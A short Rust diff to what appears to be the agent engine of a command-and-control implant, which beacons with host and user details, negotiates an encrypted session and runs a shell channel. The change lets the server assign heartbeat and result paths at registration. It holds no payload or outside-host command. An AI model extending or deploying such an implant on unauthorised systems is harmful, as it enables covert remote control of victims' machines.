@@ -22,6 +22,9 @@ pub struct AgentEngine {
     ws: Option<WsCommunicator>,
     ws_tx: Option<WsSender>,
     agent_id: String,
+    /// Profile paths adopted at registration (empty = use build-time paths).
+    heartbeat_path: String,
+    result_path: String,
 }
 
 /// Shared, thread-safe state that concurrent WS message handlers need.
@@ -47,6 +50,8 @@ impl AgentEngine {
             ws: None,
             ws_tx: None,
             agent_id: String::new(),
+            heartbeat_path: String::new(),
+            result_path: String::new(),
         }
     }
 
@@ -62,7 +67,7 @@ impl AgentEngine {
 
         libra_modules::recon::NetworkInfo::warmup_geo().await;
 
-        let http = HttpCommunicator::new(
+        let mut http = HttpCommunicator::new(
             &self.config.server_url,
             &self.config.register_path,
             &self.config.heartbeat_path,
@@ -76,12 +81,17 @@ impl AgentEngine {
         let os_version = sys["osVersion"].as_str().unwrap_or("unknown");
         let arch = sys["arch"].as_str().unwrap_or("unknown");
 
-        let (agent_id, session_key) = http.register(
+        let outcome = http.register(
             hostname, user_name, os_version, arch,
             self.crypto.rsa_public_key().unwrap_or(""),
             &self.config.beacon_secret,
             &hw_json,
         ).await?;
+
+        let agent_id = outcome.agent_id;
+        let session_key = outcome.session_key;
+        self.heartbeat_path = outcome.heartbeat_path;
+        self.result_path = outcome.result_path;
 
         // Establish AES-256-GCM session key from the RSA-encrypted blob.
         if let Some(key) = session_key {
@@ -126,8 +136,17 @@ impl AgentEngine {
         let agent_id = self.agent_id.clone();
         let server_url = self.config.server_url.clone();
         let register_path = self.config.register_path.clone();
-        let heartbeat_path = self.config.heartbeat_path.clone();
-        let result_path = self.config.result_path.clone();
+        // 优先使用注册时服务端下发的 profile 路径，缺省回退构建时路径。
+        let heartbeat_path = if self.heartbeat_path.is_empty() {
+            self.config.heartbeat_path.clone()
+        } else {
+            self.heartbeat_path.clone()
+        };
+        let result_path = if self.result_path.is_empty() {
+            self.config.result_path.clone()
+        } else {
+            self.result_path.clone()
+        };
 
         let (shell_tx, mut shell_rx) = tokio::sync::mpsc::unbounded_channel::<WebSocketMessage>();
         let hb_key = self.crypto.session_key();
